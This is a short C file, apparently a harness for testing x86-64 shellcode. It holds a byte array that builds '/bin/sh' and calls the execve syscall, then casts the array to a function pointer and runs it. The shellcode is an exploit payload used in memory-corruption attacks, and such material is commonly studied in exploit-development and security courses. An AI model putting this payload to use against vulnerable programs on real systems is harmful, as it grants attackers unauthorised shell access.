#include<stdio.h> 
#include<string.h>
#include <stdlib.h>
 

const unsigned char code[] ="\x48\x31\xc0\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x30\x51\x48\x89\xe3\x88\x43\x07\x48\x89\x5b\x08\x48\x89\x43\x10\xb0\x3b\x48\x8d\x3b\x48\x8d\x73\x08\x48\x8d\x53\x10\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x30\x61\x61\x61\x61\x61\x61\x61\x61\x62\x62\x62\x62\x62\x62\x62\x62";

void run1()

{
printf("Shellcode Length:  %d\n", (int)strlen(code));
(*(void(*)()) code)();
//int (*ret)() = (int(*)())code;
//ret();
}

void run2()  
{  
int (*ret)() = (int(*)())code;
ret();
} 

int main(int argc, char **argv) {
    int (*ret)();
    ret = (int(*)())code;
    (int)(*ret)();
    exit(0);
}
//void main(){
//run1();
//run2();
//}
